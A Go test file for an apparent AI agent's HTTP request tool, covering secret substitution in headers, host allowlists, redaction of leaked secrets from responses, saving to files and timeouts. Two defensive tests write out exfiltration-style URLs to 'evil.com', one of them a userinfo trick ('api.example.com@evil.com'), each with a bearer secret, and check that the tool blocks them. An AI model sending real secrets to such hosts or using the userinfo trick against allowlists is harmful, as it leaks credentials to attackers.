package tools

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"clod/secrets"
)

func writeTestSecrets(t *testing.T, content string) *secrets.Store {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "secrets.toml")
	os.WriteFile(path, []byte(content), 0600)
	s, err := secrets.Load(path)
	if err != nil {
		t.Fatalf("load test secrets: %v", err)
	}
	return s
}

func TestHTTPRequestBasicGET(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"ok","method":"%s"}`, r.Method)
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/test",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "HTTP 200") {
		t.Errorf("expected HTTP 200 in result: %s", result)
	}
	if !strings.Contains(result, `"status":"ok"`) {
		t.Errorf("expected response body in result: %s", result)
	}
	if !strings.Contains(result, `"method":"GET"`) {
		t.Errorf("expected GET method in result: %s", result)
	}
}

func TestHTTPRequestWithSecretHeaders(t *testing.T) {
	var receivedAuth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuth = r.Header.Get("Authorization")
		fmt.Fprint(w, `{"status":"authenticated"}`)
	}))
	defer srv.Close()

	// Parse the test server host (e.g. "127.0.0.1")
	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tool := NewHTTPRequestTool(store, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/api",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result)
	}
	// Verify the secret was resolved server-side (actual value sent in header)
	if receivedAuth != "Bearer sk-secret-123" {
		t.Errorf("server received auth = %q, want 'Bearer sk-secret-123'", receivedAuth)
	}
}

func TestHTTPRequestBlockedHost(t *testing.T) {
	store := writeTestSecrets(t, `
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["api.allowed.com"]
`)

	tool := NewHTTPRequestTool(store, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://evil.com/steal",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for blocked host")
	}
	if !strings.Contains(err.Error(), "not in allowed_hosts") {
		t.Errorf("error should mention allowed_hosts: %v", err)
	}
}

func TestHTTPRequestUserinfoAttack(t *testing.T) {
	store := writeTestSecrets(t, `
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["api.example.com"]
`)

	tool := NewHTTPRequestTool(store, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com@evil.com/steal",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for userinfo attack URL")
	}
	if !strings.Contains(err.Error(), "evil.com") {
		t.Errorf("error should mention evil.com: %v", err)
	}
}

func TestHTTPRequestNoAllowedHosts(t *testing.T) {
	store := writeTestSecrets(t, `
[legacy]
token = "sk-legacy-token"
`)

	tool := NewHTTPRequestTool(store, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com/data",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:legacy.token}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for secret without allowed_hosts")
	}
	if !strings.Contains(err.Error(), "no allowed_hosts") {
		t.Errorf("error should mention no allowed_hosts: %v", err)
	}
}

func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "public data")
	}))
	defer srv.Close()

	// nil store — no secrets at all
	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/public",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "public data") {
		t.Errorf("expected response body: %s", result)
	}
}

func TestHTTPRequestRedactResponse(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Echo back the Authorization header (simulating an API that leaks tokens)
		fmt.Fprintf(w, "your token is: %s", r.Header.Get("Authorization"))
	}))
	defer srv.Close()

	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-supersecret-should-be-redacted"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tool := NewHTTPRequestTool(store, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/echo",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if strings.Contains(result, "sk-supersecret-should-be-redacted") {
		t.Error("secret value should be redacted from response")
	}
	if !strings.Contains(result, "[REDACTED]") {
		t.Error("expected [REDACTED] placeholder in response")
	}
}

func TestHTTPRequestQueryParams(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "q=%s&page=%s", r.URL.Query().Get("q"), r.URL.Query().Get("page"))
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/search",
		"query": map[string]string{
			"q":    "test query",
			"page": "2",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "q=test query") {
		t.Errorf("expected query param q: %s", result)
	}
	if !strings.Contains(result, "page=2") {
		t.Errorf("expected query param page: %s", result)
	}
}

func TestHTTPRequestMultipleSecretsAllChecked(t *testing.T) {
	store := writeTestSecrets(t, `
[apiA]
key = "key-a"
allowed_hosts = ["api.example.com"]

[apiB]
key = "key-b"
allowed_hosts = ["other.example.com"]
`)

	tool := NewHTTPRequestTool(store, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com/data",
		"headers": map[string]string{
			"X-Api-Key-A": "{{secret:apiA.key}}",
			"X-Api-Key-B": "{{secret:apiB.key}}",
		},
	})

	// apiB.key allows other.example.com, not api.example.com — should fail
	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error when one secret doesn't allow the target host")
	}
	if !strings.Contains(err.Error(), "apiB.key") {
		t.Errorf("error should mention the failing secret: %v", err)
	}
}

func TestHTTPRequestSaveToText(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"result":"hello world"}`)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "output.json")
	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL + "/api",
		"save_to": savePath,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	// Result should have status and path but not the body
	if !strings.Contains(result, "HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result)
	}
	if !strings.Contains(result, savePath) {
		t.Errorf("expected save path in result: %s", result)
	}
	if strings.Contains(result, "hello world") {
		t.Error("body should not be in result when save_to is used")
	}

	// File should contain the response body
	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read saved file: %v", err)
	}
	if string(data) != `{"result":"hello world"}` {
		t.Errorf("saved content = %q", string(data))
	}
}

func TestHTTPRequestSaveToParentDirs(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "data")
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "sub", "dir", "output.txt")
	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"save_to": savePath,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read saved file: %v", err)
	}
	if string(data) != "data" {
		t.Errorf("saved content = %q", string(data))
	}
}

func TestHTTPRequestBinaryAutoSave(t *testing.T) {
	pngData := []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "image/png")
		w.Write(pngData)
	}))
	defer srv.Close()

	tmpDir := t.TempDir()
	tool := NewHTTPRequestTool(nil, nil, tmpDir)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/image.png",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "Saved") {
		t.Errorf("expected Saved in result: %s", result)
	}
	if !strings.Contains(result, ".png") {
		t.Errorf("expected .png extension in result: %s", result)
	}

	// Extract the saved path from result
	for _, line := range strings.Split(result, "\n") {
		if strings.HasPrefix(line, "Saved") {
			parts := strings.Fields(line)
			savedPath := parts[len(parts)-1]
			data, err := os.ReadFile(savedPath)
			if err != nil {
				t.Fatalf("read auto-saved file: %v", err)
			}
			if len(data) != len(pngData) {
				t.Errorf("saved %d bytes, want %d", len(data), len(pngData))
			}
			return
		}
	}
	t.Error("could not find Saved line in result")
}

func TestHTTPRequestTextNotAutoSaved(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"status":"ok"}`)
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	// Text responses should be returned inline, not saved
	if strings.Contains(result, "Saved") {
		t.Errorf("text response should not be auto-saved: %s", result)
	}
	if !strings.Contains(result, `"status":"ok"`) {
		t.Errorf("expected body in result: %s", result)
	}
}

func TestHTTPRequestSaveFromJSONPath(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"data":[{"url":"extracted-value"}]}`)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "output.txt")
	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url":                 srv.URL,
		"save_to":             savePath,
		"save_from_json_path": "data.0.url",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "Saved") {
		t.Errorf("expected Saved in result: %s", result)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if string(data) != "extracted-value" {
		t.Errorf("saved = %q, want %q", string(data), "extracted-value")
	}
}

func TestHTTPRequestSaveFromJSONPathDataURI(t *testing.T) {
	// Simulate an image generation API returning base64 data URI
	pngBytes := []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a}
	b64 := base64.StdEncoding.EncodeToString(pngBytes)
	dataURI := "data:image/png;base64," + b64

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		resp, _ := json.Marshal(map[string]interface{}{
			"images": []map[string]interface{}{
				{"url": dataURI},
			},
		})
		w.Write(resp)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "image.png")
	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url":                 srv.URL,
		"save_to":             savePath,
		"save_from_json_path": "images.0.url",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result, "Saved") {
		t.Errorf("expected Saved in result: %s", result)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(data) != len(pngBytes) {
		t.Errorf("saved %d bytes, want %d", len(data), len(pngBytes))
	}
	// Verify actual bytes match
	for i, b := range data {
		if b != pngBytes[i] {
			t.Errorf("byte %d: got %02x, want %02x", i, b, pngBytes[i])
			break
		}
	}
}

func TestHTTPRequestSaveFromJSONPathRequiresSaveTo(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url":                 "http://example.com",
		"save_from_json_path": "data.0.url",
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error when save_from_json_path set without save_to")
	}
	if !strings.Contains(err.Error(), "requires save_to") {
		t.Errorf("error = %v", err)
	}
}

func TestIsBinaryContentType(t *testing.T) {
	binary := []string{
		"image/png", "image/jpeg", "audio/mpeg", "video/mp4",
		"application/octet-stream", "application/pdf", "application/zip",
		"image/png; charset=utf-8",
	}
	for _, ct := range binary {
		if !isBinaryContentType(ct) {
			t.Errorf("isBinaryContentType(%q) = false, want true", ct)
		}
	}

	text := []string{
		"text/html", "text/plain", "application/json", "application/xml",
		"application/json; charset=utf-8", "application/ld+json",
		"application/vnd.api+json", "application/atom+xml", "",
	}
	for _, ct := range text {
		if isBinaryContentType(ct) {
			t.Errorf("isBinaryContentType(%q) = true, want false", ct)
		}
	}
}

func TestExtractJSONPath(t *testing.T) {
	data := []byte(`{"data":[{"url":"hello"},{"url":"world"}],"name":"test"}`)

	tests := []struct {
		path string
		want string
	}{
		{"name", "test"},
		{"data.0.url", "hello"},
		{"data.1.url", "world"},
	}
	for _, tt := range tests {
		got, err := extractJSONPath(data, tt.path)
		if err != nil {
			t.Errorf("extractJSONPath(%q): %v", tt.path, err)
			continue
		}
		if got != tt.want {
			t.Errorf("extractJSONPath(%q) = %q, want %q", tt.path, got, tt.want)
		}
	}

	// Error cases
	_, err := extractJSONPath(data, "missing")
	if err == nil {
		t.Error("expected error for missing key")
	}
	_, err = extractJSONPath(data, "data.99")
	if err == nil {
		t.Error("expected error for out of range index")
	}
}

func TestDecodeDataURI(t *testing.T) {
	// Valid base64 data URI
	raw := []byte{0x89, 0x50, 0x4e, 0x47}
	b64 := base64.StdEncoding.EncodeToString(raw)
	decoded, err := decodeDataURI("data:image/png;base64," + b64)
	if err != nil {
		t.Fatalf("decodeDataURI: %v", err)
	}
	if len(decoded) != len(raw) {
		t.Errorf("decoded %d bytes, want %d", len(decoded), len(raw))
	}

	// Not a data URI
	_, err = decodeDataURI("https://example.com")
	if err == nil {
		t.Error("expected error for non-data URI")
	}

	// Malformed (no comma)
	_, err = decodeDataURI("data:image/png;base64")
	if err == nil {
		t.Error("expected error for malformed data URI")
	}
}

func TestHTTPRequestCustomTimeout(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "ok")
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "")
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"timeout": 60,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result, "ok") {
		t.Errorf("expected ok in result: %s", result)
	}
}

func TestHTTPRequestTimeoutCap(t *testing.T) {
	// A slow server that takes 2 seconds
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(2 * time.Second)
		fmt.Fprint(w, "slow")
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "")

	// Request with 1-second timeout should fail
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"timeout": 1,
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected timeout error")
	}
	if !strings.Contains(err.Error(), "deadline exceeded") && !strings.Contains(err.Error(), "context") {
		t.Errorf("expected timeout error, got: %v", err)
	}
}
